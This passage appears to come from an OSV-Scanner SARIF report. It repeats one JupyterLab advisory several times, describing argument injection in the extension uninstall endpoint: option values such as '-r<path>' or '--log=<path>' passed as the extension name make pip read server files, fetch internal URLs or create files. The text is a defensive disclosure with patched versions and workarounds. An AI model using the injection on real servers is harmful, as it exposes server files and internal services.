              "fullDescription": {
                "markdown": "JupyterLab's PyPI extension manager runs `python -m pip uninstall` with the extension name taken from the request body. `ExtensionHandler.post` validates the name for `cmd=install` but not for `cmd=uninstall`, so a name that begins with `-` reaches the command line and pip reads it as an option rather than as a package.\n\n```python\ncmdline = [\n    sys.executable,\n    \"-m\",\n    \"pip\",\n    \"uninstall\",\n    \"--yes\",\n    \"--no-input\",\n    extension,\n]\n```\n\nAn extension name of the form `-r` followed by a path therefore made pip open that path as a requirements file. pip's parse error quotes the line it could not read and names the file it came from, and JupyterLab returned that error in the response body, so the line reached the requester.\n\nThis has security implications only for deployments that combine all of the following:\n\n- the (default) PyPI Extension Manager enabled, so that uninstall requests reach pip;\n- an authenticated account permitted to call the extension API; and\n- kernels and terminals disabled or delegated to remote hosts (otherwise a user with kernel access can read the same files and make the same outbound requests directly, regardless of this endpoint)\n\nUnlike [GHSA-37w4-hwhx-4rc4](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-37w4-hwhx-4rc4) and [GHSA-89vp-jrxv-24w8](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-89vp-jrxv-24w8), this does not need an allowlist or blocklist to be configured. The uninstall path never consulted the listing.\n\n### Impact\n\nAn authenticated user gains a read of server-side files and an outbound request from the server, both outside the confinement that the contents root and the disabled kernels were meant to provide. The user cannot choose which line of a file is returned, and cannot write content of their choosing.\n\n#### Reading files the account cannot reach\n\n`-r\u003cpath\u003e` makes pip open the path as a requirements file. The first line that pip cannot parse as a requirement comes back in the response together with the path. Blank lines and `#` comments are skipped. A line that is a valid package name is accepted silently, and the request answers 201 with no message, so a secret made only of letters, digits, dots, hyphens and underscores is not disclosed. One line is returned per request, and the requester cannot select which one.\n\nThe same option distinguishes a missing path (`[Errno 2] No such file or directory`), an unreadable one (`[Errno 13] Permission denied`) and a directory (`[Errno 21] Is a directory`), so any path on the host can be probed for existence and readability.\n\n#### Reaching hosts and ports the account cannot reach\n\n`-r` also accepts a URL. pip fetches it with an ordinary GET from the server's network position and reflects the first unparsable line of the response body the same way. A response whose body is a single line comes back in full. In a deployment where the single-user server sits inside a private network, this reaches internal services and cloud instance metadata endpoints that the user has no other route to.\n\n#### Writing files\n\n`--log=\u003cpath\u003e` makes pip create that file if it is absent and append its own log to it otherwise. The content is pip's log text, not text the requester chooses, so the effect is to create files at chosen paths and to corrupt a file that has to parse, such as a configuration file read at the next start.\n\n#### What this does not add\n\nThe same endpoint already uninstalls any installed package when it is given an ordinary, valid package name, so the injection adds no availability impact beyond what the extension manager already permits. Deployments that treat that as unacceptable should use the read-only extension manager, as described below.\n\npip refuses `--python` after a subcommand name, and ignores editable entries in an uninstall requirements file, so neither gives code execution.\n\n### Patches\n\nJupyterLab [`v4.6.4`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.6.4) and [`v4.5.11`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.11) contain the patch. The uninstall name is now validated as a PyPI package name in both the HTTP handler and `PyPIExtensionManager.uninstall`, and the pip command line carries an explicit `--` before the package operand.\n\nUsers of applications that depend on JupyterLab, such as Notebook v7+, should update `jupyterlab` package too.\n\n### Workarounds\n\nDeployments wanting to disable programmatic extension installation and removal entirely can switch to the read-only extension manager:\n\n```bash\n--LabApp.extension_manager=readonly\n```\n\nor the following traitlet:\n\n```python\nc.LabApp.extension_manager = 'readonly'\n```\n\nYou can confirm that the read-only manager is in use from GUI:\n\n\u003cimg width=\"293\" height=\"293\" alt=\"image\" src=\"https://github.com/user-attachments/assets/8016c809-633e-4ed0-a5bc-6bc4793caa0f\" /\u003e\n\nUsers lose the ability to install and remove extensions from the Extension Manager; extensions must then be installed by an administrator in the environment.\n\nNote: an egress policy that blocks outbound requests from the single-user server limits the reach of the URL variant, but does not address the file read or the file write.",
                "text": "JupyterLab's PyPI extension manager runs `python -m pip uninstall` with the extension name taken from the request body. `ExtensionHandler.post` validates the name for `cmd=install` but not for `cmd=uninstall`, so a name that begins with `-` reaches the command line and pip reads it as an option rather than as a package.\n\n```python\ncmdline = [\n    sys.executable,\n    \"-m\",\n    \"pip\",\n    \"uninstall\",\n    \"--yes\",\n    \"--no-input\",\n    extension,\n]\n```\n\nAn extension name of the form `-r` followed by a path therefore made pip open that path as a requirements file. pip's parse error quotes the line it could not read and names the file it came from, and JupyterLab returned that error in the response body, so the line reached the requester.\n\nThis has security implications only for deployments that combine all of the following:\n\n- the (default) PyPI Extension Manager enabled, so that uninstall requests reach pip;\n- an authenticated account permitted to call the extension API; and\n- kernels and terminals disabled or delegated to remote hosts (otherwise a user with kernel access can read the same files and make the same outbound requests directly, regardless of this endpoint)\n\nUnlike [GHSA-37w4-hwhx-4rc4](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-37w4-hwhx-4rc4) and [GHSA-89vp-jrxv-24w8](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-89vp-jrxv-24w8), this does not need an allowlist or blocklist to be configured. The uninstall path never consulted the listing.\n\n### Impact\n\nAn authenticated user gains a read of server-side files and an outbound request from the server, both outside the confinement that the contents root and the disabled kernels were meant to provide. The user cannot choose which line of a file is returned, and cannot write content of their choosing.\n\n#### Reading files the account cannot reach\n\n`-r\u003cpath\u003e` makes pip open the path as a requirements file. The first line that pip cannot parse as a requirement comes back in the response together with the path. Blank lines and `#` comments are skipped. A line that is a valid package name is accepted silently, and the request answers 201 with no message, so a secret made only of letters, digits, dots, hyphens and underscores is not disclosed. One line is returned per request, and the requester cannot select which one.\n\nThe same option distinguishes a missing path (`[Errno 2] No such file or directory`), an unreadable one (`[Errno 13] Permission denied`) and a directory (`[Errno 21] Is a directory`), so any path on the host can be probed for existence and readability.\n\n#### Reaching hosts and ports the account cannot reach\n\n`-r` also accepts a URL. pip fetches it with an ordinary GET from the server's network position and reflects the first unparsable line of the response body the same way. A response whose body is a single line comes back in full. In a deployment where the single-user server sits inside a private network, this reaches internal services and cloud instance metadata endpoints that the user has no other route to.\n\n#### Writing files\n\n`--log=\u003cpath\u003e` makes pip create that file if it is absent and append its own log to it otherwise. The content is pip's log text, not text the requester chooses, so the effect is to create files at chosen paths and to corrupt a file that has to parse, such as a configuration file read at the next start.\n\n#### What this does not add\n\nThe same endpoint already uninstalls any installed package when it is given an ordinary, valid package name, so the injection adds no availability impact beyond what the extension manager already permits. Deployments that treat that as unacceptable should use the read-only extension manager, as described below.\n\npip refuses `--python` after a subcommand name, and ignores editable entries in an uninstall requirements file, so neither gives code execution.\n\n### Patches\n\nJupyterLab [`v4.6.4`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.6.4) and [`v4.5.11`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.11) contain the patch. The uninstall name is now validated as a PyPI package name in both the HTTP handler and `PyPIExtensionManager.uninstall`, and the pip command line carries an explicit `--` before the package operand.\n\nUsers of applications that depend on JupyterLab, such as Notebook v7+, should update `jupyterlab` package too.\n\n### Workarounds\n\nDeployments wanting to disable programmatic extension installation and removal entirely can switch to the read-only extension manager:\n\n```bash\n--LabApp.extension_manager=readonly\n```\n\nor the following traitlet:\n\n```python\nc.LabApp.extension_manager = 'readonly'\n```\n\nYou can confirm that the read-only manager is in use from GUI:\n\n\u003cimg width=\"293\" height=\"293\" alt=\"image\" src=\"https://github.com/user-attachments/assets/8016c809-633e-4ed0-a5bc-6bc4793caa0f\" /\u003e\n\nUsers lose the ability to install and remove extensions from the Extension Manager; extensions must then be installed by an administrator in the environment.\n\nNote: an egress policy that blocks outbound requests from the single-user server limits the reach of the URL variant, but does not address the file read or the file write."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-102904](https://osv.dev/CVE-2026-102904)**\n(Also published as: [PYSEC-2026-4055](https://osv.dev/PYSEC-2026-4055), [GHSA-3325-v43h-43rv](https://osv.dev/GHSA-3325-v43h-43rv), ).\n\n## [PYSEC-2026-4055](https://osv.dev/PYSEC-2026-4055)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e JupyterLab's PyPI extension manager runs `python -m pip uninstall` with the extension name taken from the request body. `ExtensionHandler.post` validates the name for `cmd=install` but not for `cmd=uninstall`, so a name that begins with `-` reaches the command line and pip reads it as an option rather than as a package.\n\u003e \n\u003e ```python\n\u003e cmdline = [\n\u003e     sys.executable,\n\u003e     \"-m\",\n\u003e     \"pip\",\n\u003e     \"uninstall\",\n\u003e     \"--yes\",\n\u003e     \"--no-input\",\n\u003e     extension,\n\u003e ]\n\u003e ```\n\u003e \n\u003e An extension name of the form `-r` followed by a path therefore made pip open that path as a requirements file. pip's parse error quotes the line it could not read and names the file it came from, and JupyterLab returned that error in the response body, so the line reached the requester.\n\u003e \n\u003e This has security implications only for deployments that combine all of the following:\n\u003e \n\u003e - the (default) PyPI Extension Manager enabled, so that uninstall requests reach pip;\n\u003e - an authenticated account permitted to call the extension API; and\n\u003e - kernels and terminals disabled or delegated to remote hosts (otherwise a user with kernel access can read the same files and make the same outbound requests directly, regardless of this endpoint)\n\u003e \n\u003e Unlike [GHSA-37w4-hwhx-4rc4](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-37w4-hwhx-4rc4) and [GHSA-89vp-jrxv-24w8](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-89vp-jrxv-24w8), this does not need an allowlist or blocklist to be configured. The uninstall path never consulted the listing.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e An authenticated user gains a read of server-side files and an outbound request from the server, both outside the confinement that the contents root and the disabled kernels were meant to provide. The user cannot choose which line of a file is returned, and cannot write content of their choosing.\n\u003e \n\u003e #### Reading files the account cannot reach\n\u003e \n\u003e `-r\u003cpath\u003e` makes pip open the path as a requirements file. The first line that pip cannot parse as a requirement comes back in the response together with the path. Blank lines and `#` comments are skipped. A line that is a valid package name is accepted silently, and the request answers 201 with no message, so a secret made only of letters, digits, dots, hyphens and underscores is not disclosed. One line is returned per request, and the requester cannot select which one.\n\u003e \n\u003e The same option distinguishes a missing path (`[Errno 2] No such file or directory`), an unreadable one (`[Errno 13] Permission denied`) and a directory (`[Errno 21] Is a directory`), so any path on the host can be probed for existence and readability.\n\u003e \n\u003e #### Reaching hosts and ports the account cannot reach\n\u003e \n\u003e `-r` also accepts a URL. pip fetches it with an ordinary GET from the server's network position and reflects the first unparsable line of the response body the same way. A response whose body is a single line comes back in full. In a deployment where the single-user server sits inside a private network, this reaches internal services and cloud instance metadata endpoints that the user has no other route to.\n\u003e \n\u003e #### Writing files\n\u003e \n\u003e `--log=\u003cpath\u003e` makes pip create that file if it is absent and append its own log to it otherwise. The content is pip's log text, not text the requester chooses, so the effect is to create files at chosen paths and to corrupt a file that has to parse, such as a configuration file read at the next start.\n\u003e \n\u003e #### What this does not add\n\u003e \n\u003e The same endpoint already uninstalls any installed package when it is given an ordinary, valid package name, so the injection adds no availability impact beyond what the extension manager already permits. Deployments that treat that as unacceptable should use the read-only extension manager, as described below.\n\u003e \n\u003e pip refuses `--python` after a subcommand name, and ignores editable entries in an uninstall requirements file, so neither gives code execution.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e JupyterLab [`v4.6.4`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.6.4) and [`v4.5.11`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.11) contain the patch. The uninstall name is now validated as a PyPI package name in both the HTTP handler and `PyPIExtensionManager.uninstall`, and the pip command line carries an explicit `--` before the package operand.\n\u003e \n\u003e Users of applications that depend on JupyterLab, such as Notebook v7+, should update `jupyterlab` package too.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Deployments wanting to disable programmatic extension installation and removal entirely can switch to the read-only extension manager:\n\u003e \n\u003e ```bash\n\u003e --LabApp.extension_manager=readonly\n\u003e ```\n\u003e \n\u003e or the following traitlet:\n\u003e \n\u003e ```python\n\u003e c.LabApp.extension_manager = 'readonly'\n\u003e ```\n\u003e \n\u003e You can confirm that the read-only manager is in use from GUI:\n\u003e \n\u003e \u003cimg width=\"293\" height=\"293\" alt=\"image\" src=\"https://github.com/user-attachments/assets/8016c809-633e-4ed0-a5bc-6bc4793caa0f\" /\u003e\n\u003e \n\u003e Users lose the ability to install and remove extensions from the Extension Manager; extensions must then be installed by an administrator in the environment.\n\u003e \n\u003e Note: an egress policy that blocks outbound requests from the single-user server limits the reach of the URL variant, but does not address the file read or the file write.\n\n\u003c/details\u003e\n\n## [GHSA-3325-v43h-43rv](https://osv.dev/GHSA-3325-v43h-43rv)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e JupyterLab's PyPI extension manager runs `python -m pip uninstall` with the extension name taken from the request body. `ExtensionHandler.post` validates the name for `cmd=install` but not for `cmd=uninstall`, so a name that begins with `-` reaches the command line and pip reads it as an option rather than as a package.\n\u003e \n\u003e ```python\n\u003e cmdline = [\n\u003e     sys.executable,\n\u003e     \"-m\",\n\u003e     \"pip\",\n\u003e     \"uninstall\",\n\u003e     \"--yes\",\n\u003e     \"--no-input\",\n\u003e     extension,\n\u003e ]\n\u003e ```\n\u003e \n\u003e An extension name of the form `-r` followed by a path therefore made pip open that path as a requirements file. pip's parse error quotes the line it could not read and names the file it came from, and JupyterLab returned that error in the response body, so the line reached the requester.\n\u003e \n\u003e This has security implications only for deployments that combine all of the following:\n\u003e \n\u003e - the (default) PyPI Extension Manager enabled, so that uninstall requests reach pip;\n\u003e - an authenticated account permitted to call the extension API; and\n\u003e - kernels and terminals disabled or delegated to remote hosts (otherwise a user with kernel access can read the same files and make the same outbound requests directly, regardless of this endpoint)\n\u003e \n\u003e Unlike [GHSA-37w4-hwhx-4rc4](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-37w4-hwhx-4rc4) and [GHSA-89vp-jrxv-24w8](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-89vp-jrxv-24w8), this does not need an allowlist or blocklist to be configured. The uninstall path never consulted the listing.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e An authenticated user gains a read of server-side files and an outbound request from the server, both outside the confinement that the contents root and the disabled kernels were meant to provide. The user cannot choose which line of a file is returned, and cannot write content of their choosing.\n\u003e \n\u003e #### Reading files the account cannot reach\n\u003e \n\u003e `-r\u003cpath\u003e` makes pip open the path as a requirements file. The first line that pip cannot parse as a requirement comes back in the response together with the path. Blank lines and `#` comments are skipped. A line that is a valid package name is accepted silently, and the request answers 201 with no message, so a secret made only of letters, digits, dots, hyphens and underscores is not disclosed. One line is returned per request, and the requester cannot select which one.\n\u003e \n\u003e The same option distinguishes a missing path (`[Errno 2] No such file or directory`), an unreadable one (`[Errno 13] Permission denied`) and a directory (`[Errno 21] Is a directory`), so any path on the host can be probed for existence and readability.\n\u003e \n\u003e #### Reaching hosts and ports the account cannot reach\n\u003e \n\u003e `-r` also accepts a URL. pip fetches it with an ordinary GET from the server's network position and reflects the first unparsable line of the response body the same way. A response whose body is a single line comes back in full. In a deployment where the single-user server sits inside a private network, this reaches internal services and cloud instance metadata endpoints that the user has no other route to.\n\u003e \n\u003e #### Writing files\n\u003e \n\u003e `--log=\u003cpath\u003e` makes pip create that file if it is absent and append its own log to it otherwise. The content is pip's log text, not text the requester chooses, so the effect is to create files at chosen paths and to corrupt a file that has to parse, such as a configuration file read at the next start.\n\u003e \n\u003e #### What this does not add\n\u003e \n\u003e The same endpoint already uninstalls any installed package when it is given an ordinary, valid package name, so the injection adds no availability impact beyond what the extension manager already permits. Deployments that treat that as unacceptable should use the read-only extension manager, as described below.\n\u003e \n\u003e pip refuses `--python` after a subcommand name, and ignores editable entries in an uninstall requirements file, so neither gives code execution.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e JupyterLab [`v4.6.4`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.6.4) and [`v4.5.11`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.11) contain the patch. The uninstall name is now validated as a PyPI package name in both the HTTP handler and `PyPIExtensionManager.uninstall`, and the pip command line carries an explicit `--` before the package operand.\n\u003e \n\u003e Users of applications that depend on JupyterLab, such as Notebook v7+, should update `jupyterlab` package too.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Deployments wanting to disable programmatic extension installation and removal entirely can switch to the read-only extension manager:\n\u003e \n\u003e ```bash\n\u003e --LabApp.extension_manager=readonly\n\u003e ```\n\u003e \n\u003e or the following traitlet:\n\u003e \n\u003e ```python\n\u003e c.LabApp.extension_manager = 'readonly'\n\u003e ```\n\u003e \n\u003e You can confirm that the read-only manager is in use from GUI:\n\u003e \n\u003e \u003cimg width=\"293\" height=\"293\" alt=\"image\" src=\"https://github.com/user-attachments/assets/8016c809-633e-4ed0-a5bc-6bc4793caa0f\" /\u003e\n\u003e \n\u003e Users lose the ability to install and remove extensions from the Extension Manager; extensions must then be installed by an administrator in the environment.\n\u003e \n\u003e Note: an egress policy that blocks outbound requests from the single-user server limits the reach of the URL variant, but does not address the file read or the file write.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | jupyterlab | 4.6.3 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-3325-v43h-43rv | jupyterlab | 4.5.11, 4.6.4 |\n| PYSEC-2026-4055 | jupyterlab | 4.5.11, 4.6.4 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102904\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-102904](https://osv.dev/CVE-2026-102904)**\n(Also published as: [PYSEC-2026-4055](https://osv.dev/PYSEC-2026-4055), [GHSA-3325-v43h-43rv](https://osv.dev/GHSA-3325-v43h-43rv), ).\n\n## [PYSEC-2026-4055](https://osv.dev/PYSEC-2026-4055)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e JupyterLab's PyPI extension manager runs `python -m pip uninstall` with the extension name taken from the request body. `ExtensionHandler.post` validates the name for `cmd=install` but not for `cmd=uninstall`, so a name that begins with `-` reaches the command line and pip reads it as an option rather than as a package.\n\u003e \n\u003e ```python\n\u003e cmdline = [\n\u003e     sys.executable,\n\u003e     \"-m\",\n\u003e     \"pip\",\n\u003e     \"uninstall\",\n\u003e     \"--yes\",\n\u003e     \"--no-input\",\n\u003e     extension,\n\u003e ]\n\u003e ```\n\u003e \n\u003e An extension name of the form `-r` followed by a path therefore made pip open that path as a requirements file. pip's parse error quotes the line it could not read and names the file it came from, and JupyterLab returned that error in the response body, so the line reached the requester.\n\u003e \n\u003e This has security implications only for deployments that combine all of the following:\n\u003e \n\u003e - the (default) PyPI Extension Manager enabled, so that uninstall requests reach pip;\n\u003e - an authenticated account permitted to call the extension API; and\n\u003e - kernels and terminals disabled or delegated to remote hosts (otherwise a user with kernel access can read the same files and make the same outbound requests directly, regardless of this endpoint)\n\u003e \n\u003e Unlike [GHSA-37w4-hwhx-4rc4](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-37w4-hwhx-4rc4) and [GHSA-89vp-jrxv-24w8](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-89vp-jrxv-24w8), this does not need an allowlist or blocklist to be configured. The uninstall path never consulted the listing.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e An authenticated user gains a read of server-side files and an outbound request from the server, both outside the confinement that the contents root and the disabled kernels were meant to provide. The user cannot choose which line of a file is returned, and cannot write content of their choosing.\n\u003e \n\u003e #### Reading files the account cannot reach\n\u003e \n\u003e `-r\u003cpath\u003e` makes pip open the path as a requirements file. The first line that pip cannot parse as a requirement comes back in the response together with the path. Blank lines and `#` comments are skipped. A line that is a valid package name is accepted silently, and the request answers 201 with no message, so a secret made only of letters, digits, dots, hyphens and underscores is not disclosed. One line is returned per request, and the requester cannot select which one.\n\u003e \n\u003e The same option distinguishes a missing path (`[Errno 2] No such file or directory`), an unreadable one (`[Errno 13] Permission denied`) and a directory (`[Errno 21] Is a directory`), so any path on the host can be probed for existence and readability.\n\u003e \n\u003e #### Reaching hosts and ports the account cannot reach\n\u003e \n\u003e `-r` also accepts a URL. pip fetches it with an ordinary GET from the server's network position and reflects the first unparsable line of the response body the same way. A response whose body is a single line comes back in full. In a deployment where the single-user server sits inside a private network, this reaches internal services and cloud instance metadata endpoints that the user has no other route to.\n\u003e \n\u003e #### Writing files\n\u003e \n\u003e `--log=\u003cpath\u003e` makes pip create that file if it is absent and append its own log to it otherwise. The content is pip's log text, not text the requester chooses, so the effect is to create files at chosen paths and to corrupt a file that has to parse, such as a configuration file read at the next start.\n\u003e \n\u003e #### What this does not add\n\u003e \n\u003e The same endpoint already uninstalls any installed package when it is given an ordinary, valid package name, so the injection adds no availability impact beyond what the extension manager already permits. Deployments that treat that as unacceptable should use the read-only extension manager, as described below.\n\u003e \n\u003e pip refuses `--python` after a subcommand name, and ignores editable entries in an uninstall requirements file, so neither gives code execution.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e JupyterLab [`v4.6.4`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.6.4) and [`v4.5.11`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.11) contain the patch. The uninstall name is now validated as a PyPI package name in both the HTTP handler and `PyPIExtensionManager.uninstall`, and the pip command line carries an explicit `--` before the package operand.\n\u003e \n\u003e Users of applications that depend on JupyterLab, such as Notebook v7+, should update `jupyterlab` package too.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Deployments wanting to disable programmatic extension installation and removal entirely can switch to the read-only extension manager:\n\u003e \n\u003e ```bash\n\u003e --LabApp.extension_manager=readonly\n\u003e ```\n\u003e \n\u003e or the following traitlet:\n\u003e \n\u003e ```python\n\u003e c.LabApp.extension_manager = 'readonly'\n\u003e ```\n\u003e \n\u003e You can confirm that the read-only manager is in use from GUI:\n\u003e \n\u003e \u003cimg width=\"293\" height=\"293\" alt=\"image\" src=\"https://github.com/user-attachments/assets/8016c809-633e-4ed0-a5bc-6bc4793caa0f\" /\u003e\n\u003e \n\u003e Users lose the ability to install and remove extensions from the Extension Manager; extensions must then be installed by an administrator in the environment.\n\u003e \n\u003e Note: an egress policy that blocks outbound requests from the single-user server limits the reach of the URL variant, but does not address the file read or the file write.\n\n\u003c/details\u003e\n\n## [GHSA-3325-v43h-43rv](https://osv.dev/GHSA-3325-v43h-43rv)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e JupyterLab's PyPI extension manager runs `python -m pip uninstall` with the extension name taken from the request body. `ExtensionHandler.post` validates the name for `cmd=install` but not for `cmd=uninstall`, so a name that begins with `-` reaches the command line and pip reads it as an option rather than as a package.\n\u003e \n\u003e ```python\n\u003e cmdline = [\n\u003e     sys.executable,\n\u003e     \"-m\",\n\u003e     \"pip\",\n\u003e     \"uninstall\",\n\u003e     \"--yes\",\n\u003e     \"--no-input\",\n\u003e     extension,\n\u003e ]\n\u003e ```\n\u003e \n\u003e An extension name of the form `-r` followed by a path therefore made pip open that path as a requirements file. pip's parse error quotes the line it could not read and names the file it came from, and JupyterLab returned that error in the response body, so the line reached the requester.\n\u003e \n\u003e This has security implications only for deployments that combine all of the following:\n\u003e \n\u003e - the (default) PyPI Extension Manager enabled, so that uninstall requests reach pip;\n\u003e - an authenticated account permitted to call the extension API; and\n\u003e - kernels and terminals disabled or delegated to remote hosts (otherwise a user with kernel access can read the same files and make the same outbound requests directly, regardless of this endpoint)\n\u003e \n\u003e Unlike [GHSA-37w4-hwhx-4rc4](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-37w4-hwhx-4rc4) and [GHSA-89vp-jrxv-24w8](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-89vp-jrxv-24w8), this does not need an allowlist or blocklist to be configured. The uninstall path never consulted the listing.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e An authenticated user gains a read of server-side files and an outbound request from the server, both outside the confinement that the contents root and the disabled kernels were meant to provide. The user cannot choose which line of a file is returned, and cannot write content of their choosing.\n\u003e \n\u003e #### Reading files the account cannot reach\n\u003e \n\u003e `-r\u003cpath\u003e` makes pip open the path as a requirements file. The first line that pip cannot parse as a requirement comes back in the response together with the path. Blank lines and `#` comments are skipped. A line that is a valid package name is accepted silently, and the request answers 201 with no message, so a secret made only of letters, digits, dots, hyphens and underscores is not disclosed. One line is returned per request, and the requester cannot select which one.\n\u003e \n\u003e The same option distinguishes a missing path (`[Errno 2] No such file or directory`), an unreadable one (`[Errno 13] Permission denied`) and a directory (`[Errno 21] Is a directory`), so any path on the host can be probed for existence and readability.\n\u003e \n\u003e #### Reaching hosts and ports the account cannot reach\n\u003e \n\u003e `-r` also accepts a URL. pip fetches it with an ordinary GET from the server's network position and reflects the first unparsable line of the response body the same way. A response whose body is a single line comes back in full. In a deployment where the single-user server sits inside a private network, this reaches internal services and cloud instance metadata endpoints that the user has no other route to.\n\u003e \n\u003e #### Writing files\n\u003e \n\u003e `--log=\u003cpath\u003e` makes pip create that file if it is absent and append its own log to it otherwise. The content is pip's log text, not text the requester chooses, so the effect is to create files at chosen paths and to corrupt a file that has to parse, such as a configuration file read at the next start.\n\u003e \n\u003e #### What this does not add\n\u003e \n\u003e The same endpoint already uninstalls any installed package when it is given an ordinary, valid package name, so the injection adds no availability impact beyond what the extension manager already permits. Deployments that treat that as unacceptable should use the read-only extension manager, as described below.\n\u003e \n\u003e pip refuses `--python` after a subcommand name, and ignores editable entries in an uninstall requirements file, so neither gives code execution.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e JupyterLab [`v4.6.4`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.6.4) and [`v4.5.11`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.11) contain the patch. The uninstall name is now validated as a PyPI package name in both the HTTP handler and `PyPIExtensionManager.uninstall`, and the pip command line carries an explicit `--` before the package operand.\n\u003e \n\u003e Users of applications that depend on JupyterLab, such as Notebook v7+, should update `jupyterlab` package too.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Deployments wanting to disable programmatic extension installation and removal entirely can switch to the read-only extension manager:\n\u003e \n\u003e ```bash\n\u003e --LabApp.extension_manager=readonly\n\u003e ```\n\u003e \n\u003e or the following traitlet:\n\u003e \n\u003e ```python\n\u003e c.LabApp.extension_manager = 'readonly'\n\u003e ```\n\u003e \n\u003e You can confirm that the read-only manager is in use from GUI:\n\u003e \n\u003e \u003cimg width=\"293\" height=\"293\" alt=\"image\" src=\"https://github.com/user-attachments/assets/8016c809-633e-4ed0-a5bc-6bc4793caa0f\" /\u003e\n\u003e \n\u003e Users lose the ability to install and remove extensions from the Extension Manager; extensions must then be installed by an administrator in the environment.\n\u003e \n\u003e Note: an egress policy that blocks outbound requests from the single-user server limits the reach of the URL variant, but does not address the file read or the file write.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | jupyterlab | 4.6.3 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-3325-v43h-43rv | jupyterlab | 4.5.11, 4.6.4 |\n| PYSEC-2026-4055 | jupyterlab | 4.5.11, 4.6.4 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102904\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-102904",
              "name": "CVE-2026-102904",
              "properties": {
                "security-severity": "5.4"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-102904: JupyterLab: Argument injection in JupyterLab extension uninstall exposes server-readable files and internal URLs",
                "text": "CVE-2026-102904: JupyterLab: Argument injection in JupyterLab extension uninstall exposes server-readable files and internal URLs"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-112393",
                "BIT-pillow-2026-112393",
                "GHSA-332p-7hrc-92wf"
              ],
              "fullDescription": {
